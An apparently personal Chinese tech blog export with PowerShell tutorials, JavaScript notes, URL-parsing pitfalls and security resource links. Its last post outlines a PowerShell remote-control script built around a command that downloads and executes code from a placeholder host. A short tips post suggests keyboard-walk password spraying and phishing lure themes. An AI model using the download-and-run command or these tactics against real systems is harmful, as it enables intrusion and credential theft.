<li>获取授权部分信息（登录信息+地址+端口）：依次查找“/”、“？”、“#”，哪个先出现以哪个为准截取，除了IE和Safari，分号；也是可接受的分隔符。</li>
</ol>
<ul>
<li>授权部分信息提取出来后，先查找@符号，如果找到了，那它前面的部分就是登录信息，冒号前面是用户名，后面是密码</li>
<li>剩下部分就是地址了，查找冒号：，如果有则前面的部分是地址，后面部分是端口，如果发现方括号[]，说明地址是IPv6</li>
</ul>
<ol>
<li>确定路径</li>
<li>提取查询字符串</li>
<li>提取片段ID</li>
</ol>
<h2 id="陷阱和问题">陷阱和问题</h2><ol>
<li><a href="http://example.com&amp;gibberish=1234@167772161/" target="_blank" rel="external">http://example.com&amp;gibberish=1234@167772161/</a><br>这个地址实际上指向的是167772161，转成正常的IPv4地址是10.0.0.1，@前面的部分是无效身份验证信息。</li>
<li><a href="http://example.com\@coredump.cx/" target="_blank" rel="external">http://example.com\@coredump.cx/</a><br>在FireFox里会访问coredump.cx，而其他浏览器里会访问example.com。</li>
<li><a href="http://example.com;.coredump.cx/" target="_blank" rel="external">http://example.com;.coredump.cx/</a><br>IE会访问coredump.cx，而其他浏览器会访问example.com。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Some Tips]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<ul>
<li>超过100人的公司，用键盘走位密码跑一遍，总会有收获。</li>
<li>Fishing内容：招聘——投递简历 科研——会议邀请 媒体——策划方案 销售——咨询产品 网站——错误反馈</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Fishing </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PowerShell XML处理和注册表(Default)取值 坑两则]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<ol>
<li>处理XML时，PowerShell支持直接以对象的方式访问节点，像这样</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;report&gt;</span><br><span class="line"><span class="code">	&lt;baseInfo&gt;</span></span><br><span class="line"><span class="code">		&lt;systemLanguage&gt;zh-CN&lt;/systemLanguage&gt;</span></span><br><span class="line"><span class="code">	&lt;/baseInfo&gt;</span></span><br><span class="line"><span class="code">	&lt;error&gt;</span></span><br><span class="line"><span class="code">	&lt;/error&gt;</span></span><br><span class="line">&lt;/report&gt;</span><br><span class="line"></span><br><span class="line">PS C:\Users\Woody&gt; $xmlObj.report.baseInfo</span><br><span class="line"></span><br><span class="line"><span class="header">systemLanguage</span><br><span class="line">--------------</span></span><br><span class="line">zh-CN</span><br></pre></td></tr></table></figure>
<p>但如果目标节点是没有子级，这样取到的节点类型不是xmlnode，而是object，如下所示。<br><a id="more"></a></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Woody&gt; <span class="variable">$test</span><span class="class">.report</span><span class="class">.baseInfo</span><span class="class">.systemlanguage</span><span class="class">.getType</span>()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line">-------- -------- ----                                     --------</span><br><span class="line">True     True     String                                   System<span class="class">.Object</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Woody&gt; <span class="variable">$test</span><span class="class">.report</span><span class="class">.baseInfo</span><span class="class">.getType</span>()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line">-------- -------- ----                                     --------</span><br><span class="line">True     False    XmlElement                               System<span class="class">.Xml</span><span class="class">.XmlLinkedNode</span></span><br></pre></td></tr></table></figure>
<p>所以，如果想给一个空的节点添加子节点就不能这样写，因为没有对应方法，应该用selectNodes代替，如下所示。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="keyword">C</span>:\Users\Woody&gt; $test.report.selectnodes(<span class="string">"error"</span>).item(<span class="number">0</span>).gettype()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line">-------- -------- ----                                     --------</span><br><span class="line"><span class="keyword">True</span>     <span class="keyword">False</span>    XmlElement                               System.Xml.XmlLinkedNode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS <span class="keyword">C</span>:\Users\Woody&gt; $test.report.error.gettype()</span><br><span class="line"></span><br><span class="line">IsPublic IsSerial Name                                     BaseType</span><br><span class="line">-------- -------- ----                                     --------</span><br><span class="line"><span class="keyword">True</span>     <span class="keyword">True</span>     <span class="keyword">String</span>                                   System.Object</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS <span class="keyword">C</span>:\Users\Woody&gt; $test.report.error.appendChild</span><br><span class="line">   ##没反应，表示不存在##</span><br><span class="line">PS <span class="keyword">C</span>:\Users\Woody&gt; $test.report.selectnodes(<span class="string">"error"</span>).item(<span class="number">0</span>).appendChild</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MemberType          : <span class="keyword">Method</span></span><br><span class="line">OverloadDefinitions : <span class="list">&#123;System.Xml.XmlNode AppendChild(System.Xml.XmlNode newChild)&#125;</span></span><br><span class="line">TypeNameOfValue     : System.Management.Automation.PSMethod</span><br><span class="line"><span class="keyword">Value</span>               : System.Xml.XmlNode AppendChild(System.Xml.XmlNode newChild)</span><br><span class="line">Name                : AppendChild</span><br><span class="line">IsInstance          : <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
<ol>
<li>注册表里有些键比较特殊，它里面包含一个Default项，如下图所示。如果想用PowerShell取这个值，要格外注意，<strong>PowerShell自带的注册表访问方法是没法访问到这个值的，这是个Bug，</strong> 我试了无数种访问方法，都不行，目测是（默认）和 (Default)这俩键值造成的冲突。</li>
</ol>
<p><img src="http://7xlizz.com1.z0.glb.clouddn.com/注册表.png" alt=""><br><img src="http://7xlizz.com1.z0.glb.clouddn.com/注册表操作.png" alt=""></p>
<p>解决办法只能是改用CMD的方式，用reg命令解决，如下所示。<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg Query HKLM<span class="command">\System</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Nls</span><span class="command">\Locale</span><span class="command">\ </span>/v "(Default)"</span><br></pre></td></tr></table></figure></p>
<p>注意要先括号再引号</p>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PowerShell 判断操作系统语言]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>###用PowerShell判断系统语言的的几种方法：</p>
<ol>
<li>systeminfo.exe<br>最简单的方法，但是数据不好进一步处理，而且速度慢</li>
<li><p>WMI对象</p>
<pre><code>(<span class="keyword">get</span>-wmiobject win32_operatingsystem).MUILanguages
</code></pre></li>
<li><p>用.net对象获取，结果更加完整</p>
<pre><code><span class="comment">PS</span> <span class="comment">C:\Users\Woody</span>&gt; <span class="title">[</span><span class="comment">System</span><span class="string">.</span><span class="comment">Globalization</span><span class="string">.</span><span class="comment">Cultureinfo</span><span class="title">]</span><span class="comment">::InstalledUICulture</span>

<span class="comment">LCID</span>             <span class="comment">Name</span>             <span class="comment">DisplayName</span>
<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>             <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>             <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>
<span class="comment">2052</span>             <span class="comment">zh</span><span class="literal">-</span><span class="comment">CN</span>            <span class="comment">中文(中华人民共和国)、</span>
</code></pre><a id="more"></a>
</li>
<li><p>读注册表键值</p>
</li>
</ol>
<pre><code><span class="keyword">function</span> getSysLangurage(){
   <span class="variable">$langNum</span> = reg Query HKLM\System\CurrentControlSet\Control\Nls\Locale\ /v <span class="string">"(Default)"</span>
   if(<span class="variable">$langNum</span> -like <span class="string">"*00000804"</span>){
   return <span class="string">"CH"</span>
   }
   elseif(<span class="variable">$langNum</span> -like <span class="string">"*00000409"</span>){
   return <span class="string">"EN"</span>
   }
   else
   {return <span class="string">"other"</span>}
}
</code></pre>]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PowerShell学习资料整理]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>这篇博文会长期更新，整理一些PowerShell、PowerShell安全相关的网站和学习资料。<br><a id="more"></a></p>
<h2 id="基础资料：">基础资料：</h2><ul>
<li><a href="https://msdn.microsoft.com/en-us/powershell" title="MSDN" target="_blank" rel="external">微软PowerShell官网</a></li>
<li><a href="http://blogs.msdn.com/b/powershell/" target="_blank" rel="external">MSDN PowerShell Blog</a> 官博，很多新内容</li>
<li><a href="http://www.pstips.net/" target="_blank" rel="external">PowerShell中文站</a> 有翻译好的在线教程，提供电子书下载</li>
<li><a href="http://powershell.com/cs/" target="_blank" rel="external">PowerShell英文站</a> 资料各种全</li>
<li><a href="http://blog.vichamp.com/" target="_blank" rel="external">微软MVP吴波博客 叹为观止</a> 常年更新PowerShell技巧</li>
<li><a href="http://powershell.net/" target="_blank" rel="external">PowerShellMagazine</a> 偏资讯类</li>
<li><a href="http://study.163.com/course/introduction/1270015.htm#/courseDetail" target="_blank" rel="external">网易云课堂 PowerShell管理第一季</a> 收费的，但也收录进来万一有人需要</li>
</ul>
<h2 id="GitHub">GitHub</h2><ul>
<li><a href="https://github.com/powershell" target="_blank" rel="external">PowerShell Module库</a></li>
<li><a href="https://github.com/samratashok/nishang" target="_blank" rel="external">Nishang 安全相关PowerShell脚本集合（后门爆破扫描等等）</a></li>
<li><a href="https://github.com/besimorhino/powercat" target="_blank" rel="external">PowerCat PS版的Netcat</a></li>
</ul>
<h2 id="下载资料">下载资料</h2><ul>
<li><a href="http://www.pstips.net/professional-windows-powershell-programing.html" target="_blank" rel="external">Windows PowerShell 高级编程</a></li>
<li><a href="http://www.pstips.net/powershell-v3-basic-tutorial.html" target="_blank" rel="external">PowerShell 3.0 入门级教程</a></li>
<li><a href="http://www.pstips.net/powershell-3-0-advanced-tutorial-pdf.html" target="_blank" rel="external">PowerShell 3.0 进阶教程</a></li>
<li><a href="http://blog.vichamp.com/powershell/2014/02/14/powershell-mva-lessons/" target="_blank" rel="external">PowerShell 微软虚拟学院课程</a></li>
</ul>
<h2 id="安全相关资料">安全相关资料</h2><ul>
<li><a href="http://open.freebuf.com/live/619.html" target="_blank" rel="external">FreeBuf公开课 PowerShell内网渗透实例</a></li>
<li><a href="http://www.windowsecurity.com/articles-tutorials/windows_os_security/PowerShell-Security.html" target="_blank" rel="external">PowerShell Security</a></li>
<li><a href="http://drops.wooyun.org/tips/8971" target="_blank" rel="external">通过DNS TXT记录执行powershell</a></li>
<li><a href="http://drops.wooyun.org/tips/8568" target="_blank" rel="external">使用powershell Client进行有效钓鱼</a></li>
<li><a href="http://drops.wooyun.org/tips/6199" target="_blank" rel="external">powershell各种反弹姿势以及取证（一）</a></li>
<li><a href="http://drops.wooyun.org/tips/6090" target="_blank" rel="external">powershell各种反弹姿势以及取证（二）</a></li>
<li><a href="http://drops.wooyun.org/tips/4707" target="_blank" rel="external">Powershell and Windows RAW SOCKET</a></li>
<li><a href="http://drops.wooyun.org/tips/3473" target="_blank" rel="external">Powershell tricks::Powershell Remoting</a></li>
<li><a href="http://drops.wooyun.org/tips/3353" target="_blank" rel="external">Powershell tricks::Bypass AV</a></li>
<li><a href="http://drops.wooyun.org/tips/9336" target="_blank" rel="external">BadUsb与PowerShell的结合利用</a></li>
<li><a href="http://drops.wooyun.org/tips/8290" target="_blank" rel="external">WMI Defense (PowerShell操作WMI)</a></li>
<li><a href="http://drops.wooyun.org/tips/8260" target="_blank" rel="external">WMI Backdoor</a></li>
<li><a href="http://drops.wooyun.org/tips/8189" target="_blank" rel="external">WMI Attacks</a></li>
<li><a href="http://www.freebuf.com/articles/web/76892.html" target="_blank" rel="external">Empire：PowerShell后期漏洞利用代理工具</a></li>
<li><a href="https://blog.netspi.com/powershell-remoting-cheatsheet/" target="_blank" rel="external">PowerShell Remoting Cheatsheet</a></li>
</ul>
<h2 id="PowerShell其他应用">PowerShell其他应用</h2><p>暂缺</p>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PowerShell入门系列2:cmdlet]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h3 id="什么是cmdlet">什么是cmdlet</h3><ul>
<li>PowerShell里可以执行<strong>内置的命令</strong>和用户定义的内容（函数、脚本、别名、过滤器），还有可执行程序。<br>其中<strong>内置的命令</strong>就叫做cmdlet，换个说法就是系统命令，也是继续学习PowerShell的基础。</li>
<li>cmdlet的特殊之处在于，每一个cmdlet都是一个.net object，运行于PowerShell进程里。</li>
<li>cmdlet的格式是<strong>动词-名词，不区分大小写</strong>，很清晰很长很恶心，但你可以自定义别名来缩短，这个后面还会讲。</li>
</ul>
<h3 id="两条基础cmdlet">两条基础cmdlet</h3><ul>
<li><p><strong>Get-Command</strong>，我们直接在PowerShell里执行Get-Command，结果如下</p>
<pre><code>PS C:\Users\Woody&gt; <span class="keyword">Get</span>-Command
CommandType     Name                            Definition
-----------     ----                            ----------
<span class="keyword">Alias</span>           %                               ForEach-<span class="built_in">Object</span>
<span class="keyword">Alias</span>           ac                              Add-Content
<span class="keyword">Alias</span>           asnp                            Add-PSSnapIn
<span class="keyword">Alias</span>           clc                             Clear-Content
<span class="keyword">Alias</span>           cli                             Clear-Item
<span class="keyword">Alias</span>           clp                             Clear-ItemProperty
<span class="keyword">Alias</span>           clv                             Clear-Variable
<span class="keyword">Alias</span>           <span class="keyword">compare</span>                         <span class="keyword">Compare</span>-<span class="built_in">Object</span>
<span class="keyword">Alias</span>           cpi                             Copy-Item
<span class="keyword">Alias</span>           cpp                             Copy-ItemProperty
<span class="keyword">Alias</span>           cvpa                            Convert-Path
<span class="keyword">Alias</span>           dbp                             Disable-PSBreakpoin
<span class="keyword">Alias</span>           diff                            <span class="keyword">Compare</span>-<span class="built_in">Object</span>
<span class="keyword">Alias</span>           ebp                             Enable-PSBreakpoint
<span class="keyword">Alias</span>           epal                            Export-<span class="keyword">Alias</span>
<span class="keyword">Alias</span>           epcsv                           Export-Csv
<span class="keyword">Alias</span>           fc                              Format-<span class="keyword">Custom</span>
</code></pre><p>  ……</p>
</li>
</ul>
<p><strong>Get-Command不加任何的参数时，作用是显示当前作用域/当前会话支持的所有命令</strong>（不仅限于Cmdlet）</p>
<p>那如果想只查看Cmdlet命令呢，以传统cmd的处理方式就是用|管道符传递给findstr然后过滤，如下。</p>
<pre><code>PS <span class="keyword">C</span>:\Users\Woody&gt; <span class="keyword">Get</span>-Command|findstr <span class="string">"Cmdlet"</span>
Cmdlet  Add-ComputerAdd-Computer [-DomainName] &lt;...
Cmdlet  Add-Content Add-Content [-<span class="keyword">Path</span>] &lt;<span class="keyword">String</span>[...
Cmdlet  Add-History Add-History [[-InputObject] ...
Cmdlet  Add-Member  Add-Member [-MemberType] &lt;PS...
Cmdlet  Add-PSSnapinAdd-PSSnapin [-Name] &lt;<span class="keyword">String</span>...
Cmdlet  Add-TypeAdd-Type [-TypeDefinition] &lt;...
Cmdlet  Checkpoint-Computer Checkpoint-Computer [-Descri...
Cmdlet  <span class="keyword">Clear</span>-Content   <span class="keyword">Clear</span>-Content [-<span class="keyword">Path</span>] &lt;Strin...
Cmdlet  <span class="keyword">Clear</span>-EventLog  <span class="keyword">Clear</span>-EventLog [-LogName] &lt;S...
Cmdlet  <span class="keyword">Clear</span>-History   <span class="keyword">Clear</span>-History [[-Id] &lt;Int32[...
Cmdlet  <span class="keyword">Clear</span>-<span class="keyword">Item</span>  <span class="keyword">Clear</span>-<span class="keyword">Item</span> [-<span class="keyword">Path</span>] &lt;<span class="keyword">String</span>[]...
Cmdlet  <span class="keyword">Clear</span>-ItemProperty  <span class="keyword">Clear</span>-ItemProperty [-<span class="keyword">Path</span>] &lt;...
Cmdlet  <span class="keyword">Clear</span>-Variable  <span class="keyword">Clear</span>-Variable [-Name] &lt;Stri...
……
……
</code></pre><p><strong>我们可以用Get-Command findstr来查看具体命令的属性</strong></p>
<pre><code>PS C:<span class="command">\Users</span><span class="command">\Woody</span>&gt; Get-Command findstr

CommandType     Name                            Definition
-----------     ----                            ----------
Application     findstr.exe                     C:<span class="command">\Windows</span><span class="command">\system</span>32<span class="command">\findstr</span>.exe
</code></pre><p>从CommandType我们可以发现    ，findstr并不是一个Cmdlet，而是一个可执行程序。那怎么用Cmdlet的方式来实现呢？引入下一个Cmdlet:Get-Help</p>
<ul>
<li><p>Get-Help，执行Get-Help Get-Command,结果如下</p>
<p>  PS C:\Users\Woody&gt; Get-Help Get-Command</p>
<p>  名称</p>
<pre><code><span class="keyword">Get</span>-Command
</code></pre><p>  摘要</p>
<pre><code>获取有关 cmdlet 以及有关 Windows PowerShell 命令的其他元素的基本信息。
</code></pre><p>  语法</p>
<pre><code>Get-Command <span class="comment">[<span class="comment">[-Name]</span> &lt;string<span class="comment">[]</span>&gt;]</span> <span class="comment">[-CommandType {Alias | Function | Filter |
 Cmdlet | ExternalScript | Application | Script | All}]</span> <span class="comment">[<span class="comment">[-ArgumentList]</span> &lt;O
bject<span class="comment">[]</span>&gt;]</span> <span class="comment">[-Module &lt;string<span class="comment">[]</span>&gt;]</span> <span class="comment">[-Syntax]</span> <span class="comment">[-TotalCount &lt;int&gt;]</span> <span class="comment">[&lt;CommonParame
ters&gt;]</span>

Get-Command <span class="comment">[-Noun &lt;string<span class="comment">[]</span>&gt;]</span> <span class="comment">[-Verb &lt;string<span class="comment">[]</span>&gt;]</span> <span class="comment">[<span class="comment">[-ArgumentList]</span> &lt;Object<span class="comment">[
]</span>&gt;]</span> <span class="comment">[-Module &lt;string<span class="comment">[]</span>&gt;]</span> <span class="comment">[-Syntax]</span> <span class="comment">[-TotalCount &lt;int&gt;]</span> <span class="comment">[&lt;CommonParameters&gt;]</span>
</code></pre><p>  说明</p>
<pre><code><span class="keyword">Get</span>-Command cmdlet 获取会话中 Windows PowerShell 命令的 cmdlet 及其他元素（
例如，别名、函数、筛选器、脚本和应用程序）的基本信息。

<span class="keyword">Get</span>-Command 直接从 cmdlet、函数、脚本或别名的代码中获取其数据，而不像 <span class="keyword">Get</span>-H
elp 那样从帮助主题文件中获取其信息。

如果不使用参数，“<span class="keyword">Get</span>-Command”将获取当前会话中的所有 cmdlet 和函数。“<span class="keyword">Get</span>-
Command *”获取所有 Windows PowerShell 元素以及 <span class="keyword">Path</span> 环境变量 ($env:path)
中的所有非 Windows-PowerShell 文件。它将这些文件归入“Application”命令类型
。

可以使用 <span class="keyword">Get</span>-Command 的 <span class="keyword">Module</span> 参数查找通过添加 Windows PowerShell 管理单元
或导入模块而添加到会话中的命令。
……
……
</code></pre></li>
</ul>
<p>Get-Help的用法很简单，就是Get-Help 命令，结果里会详细的把各种信息都罗列出来。从结果我们可以看到Get-Command的其他参数，所以我们可以用Get-Command -CommandTpye cmdlet 来实现上面的功能，结果是一样的。</p>
<p>有了这两个命令，其他命令就可以遇到再自食其力解决了。</p>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Skill List]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h3 id="2016年前该读完">2016年前该读完</h3><ul>
<li>《Javascript高级编程》</li>
<li>《Python灰帽子编程》</li>
<li>《现代操作系统》</li>
</ul>
<h3 id="要熟练什么">要熟练什么</h3><ul>
<li>LinuxBash</li>
<li>PowerShell</li>
<li>Python爬虫</li>
<li>PHP、JS常用操作</li>
</ul>
<h3 id="接下来做出什么">接下来做出什么</h3><ul>
<li>维护好博客</li>
<li>一个靠谱爬虫项目</li>
<li>保持提交漏洞</li>
<li>leetcode</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> oter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PowerShell入门系列1：介绍和快速开始]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h2 id="PowerShell简介">PowerShell简介</h2><h3 id="PowerShell是什么？">PowerShell是什么？</h3><p>PowerShell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。<br>相比Linux里的shell，Windows自带的cmd命令提示符显得有些简陋，所以从Windows 7之后微软提供了cmd的超级升级版——PowerShell。</p>
<a id="more"></a>
<h3 id="怎么安装PowerShell？">怎么安装PowerShell？</h3><p>大部分情况下是不需要安装的</p>
<p>Windows 7/Windows Server 2008 内置PowerShell 2.0 <br><br>Windows 8/Windows Server 2012 内置PowerShell 3.0 <br><br>Windows 8.1/Windows Server 2012 R2 内置 PowerShell 4.0 <br><br>Windows 10 内置PowerShell 5.0预览版 <br></p>
<p>使用$psversiontable变量可以查看PowerShell，.net框架的版本。</p>
<pre><code>PS C:\Users\Admin&gt; $psversiontable

Name   Value
----   -----
CLRVersion <span class="number">2.0</span><span class="number">.50727</span><span class="number">.5485</span>
BuildVersion   <span class="number">6.1</span><span class="number">.7601</span><span class="number">.17514</span>
PSVersion  <span class="number">2.0</span>
WSManStackVersion  <span class="number">2.0</span>
PSCompatibleVersions   {<span class="number">1.0</span>, <span class="number">2.0</span>}
SerializationVersion   <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span>
PSRemotingProtocolVersion  <span class="number">2.1</span>
</code></pre><p>PowerShell 2.0已经可以满足大部分需求了，<strong>如果需要新版本升级到这里下载</strong>：<br></p>
<blockquote>
<p>PowerShell4.0 MSDN官方下载地址： <a href="https://www.microsoft.com/en-us/download/details.aspx?id=40855" target="_blank" rel="external">https://www.microsoft.com/en-us/download/details.aspx?id=40855</a></p>
</blockquote>
<h3 id="PowerShell有哪些功能和特点？">PowerShell有哪些功能和特点？</h3><ul>
<li>PowerShell传递的是.net Object（PSObject），这与LinuxShell、CMD完全不同</li>
<li>PowerShell有完整的强类型支持</li>
<li>PowerShell和.net 还有COM、WMI、ADSI是无缝结合的</li>
<li>PowerShell支持CMD原有的所有命令</li>
<li>PowerShell的命令叫做cmdlet，采用动词-名词的形式，不区分大小写</li>
</ul>
<h3 id="快速开始">快速开始</h3><p>在运行里直接输入powershell，或者在附件 -&gt; Windows PowerShell里面打开。<br><br>PS：如果在Windows7里面，这两种方式打开的PowerShell背景颜色、窗体样式不一样，但实际上它们都是同一个文件%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe，<b>没有任何区别</b>，只不过在附件里的快捷方式设置了一下背景颜色和窗体大小。</p>
<p>按照传统，写一个最简单的hello world，<br>在这里可以使用cmd的echo命令”hello world”，也可以使用write(“hello world”)<br>或者，其实他们本质是一样的，他们都是Write-Out的别名（Alias）</p>
<pre><code>PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; write "hello world"
hello world
PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; echo("hello world")
hello world
PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; write hello world
hello
world
PS C:<span class="command">\Users</span><span class="command">\Test</span>&gt; echo "hello world"
hello world
</code></pre><p>执行一下你会发现与cmd里输出echo hello world还是有区别的，cmd里输出echo “hello world”会把引号也输出，而PS里加上括号/引号都会当成一个字符串输出，什么都不加时会分行输出。如上面代码所示。</p>
<p>除了直接在Shell界面操作，也可以在文本编辑器里写了PS脚本，然后保存为.ps1格式，右键 -&gt; 以PowerShell格式运行。</p>
<p>当然，更推荐的code环境是PowerShell ISE，Win7以上系统全部自带，在运行输入powershell ise或者在附件里打开，界面如下图：<br><img src="http://7xlizz.com1.z0.glb.clouddn.com/QQ截图20150921182557.png" alt=""></p>
<p>简单介绍一下：最上面一栏是脚本文件编辑的，中间一栏是运行结果，第三栏是console。这个编辑器看着简单其实功能蛮多的，之后会再次详细介绍。</p>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入理解JS笔记 1：数据类型Tips]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>备注：为了方便阅读《Javascript高级程序设计》 以下简称为 《J高》，笔记会引用很多该书内容，同时非常感谢笨蛋的座右铭的《理解Javascript》一系列文章。</p>
<h2 id="引用数据类型和原始数据类型">引用数据类型和原始数据类型</h2><ul>
<li>ECMA-262 把类型（type）定义为值的集合，每种原始类型定义了包含它的值的范围及其字面量表示形式</li>
<li>5种原始数据类型：Null、Boolean、Number、String</li>
<li>引用类型就是类（class），引用值就是对象，所以引用类型变量typeof的运算结果一定是一个object</li>
<li>原始数据类型其值存在栈中，引用数据类型值存在堆中</li>
<li>也就是说原始类型的值直接存在变量访问的位置，而引用类型存在变量处的值是一个指向堆的指针 </li>
<li>String类型比较特殊，它是唯一没有固定大小的原始类型，不过它还是存在栈中……</li>
<li>每一个基础类型都有其对应的引用类型number Number,string String,boolean Boolean，推测结论：基本数据类型是对应引用数据类型的子类，为了提高效率，将基础类型放在了栈内存中，所以undefined继承自null（存疑）</li>
<li>因此所有原始类型也都是伪类，都拥有toString()等object的方法</li>
<li>object</li>
</ul>
<a id="more"></a>
<h2 id="undefined_和_null">undefined 和 null</h2><ul>
<li>Undefined 代表未赋值的基本数据类型，Null 代表未赋值的引用数据类型</li>
<li>Undefined 只有唯一值 undefined，Null下只有唯一的值 null （注意大小写 =。=）</li>
<li>但是为了效率，null 作为引用数据类型，其值仍然存在栈中</li>
<li>因此导致了 null == undefined</li>
<li>《J高》里的说法是，值undefined实际是从null派生（继承）而来的，所以null == undefined</li>
<li>《J高》：typeof(null)会返回object，这是Javascript最初实现中的一个错误，但一直沿用至今，现在null被认为是对象的占位符，但从技术上来说它仍然是原始值（“从技术上说null是原始值”，大概是因为null存在栈中）</li>
<li>null 在参与数值运算时其值会自动转换为 0 ，undefined参与任何数值运算时，结果为NaN</li>
<li>当函数无明确返回值时，返回的值是undefined</li>
</ul>
<h2 id="对象和函数">对象和函数</h2><ul>
<li>对象是一个无序属性的集合，这些属性的值位简单数据类型、对象或者函数。</li>
<li>函数是对象的一种，实现上内部熟悉[[Class]]的值位 “Function” ，表明它是函数类型，除了对象的内部属性方法外，还有[[Construct]]、[[Call]]、[[Scope]]等内部属性。内部方法[[Construct]]用于实现作为构造器的逻辑，[[Call]]实现作为函数调用的逻辑。</li>
<li>Function是函数类型的用户接口</li>
<li>Object是对象类型的用户接口</li>
<li>Boolean，Number，String均为这三种简单数值类型的<strong>对象包装器</strong></li>
<li>Date, Array, RegExp: 可以把它们看作是几种内置的扩展数据类型</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python+PowerShell 一句话远控脚本思路]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。</p>
<p>这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。<br>其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。<br><a id="more"></a></p>
<h2 id="原理">原理</h2><p><code>iex (New-Object Sys.Net.Webclient).DownloadString(&quot;http://IP:Port/connect&quot;)</code> </p>
<ul>
<li>用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行</li>
<li>客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果</li>
<li>服务端通过建立连接后收到的第一段数据判断是哪一种请求</li>
</ul>
<p>客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。</p>
<h2 id="TODO">TODO</h2><ul>
<li>客户端增加注册表操作</li>
<li>优化文件上传下载</li>
<li>客户端的异常处理</li>
</ul>
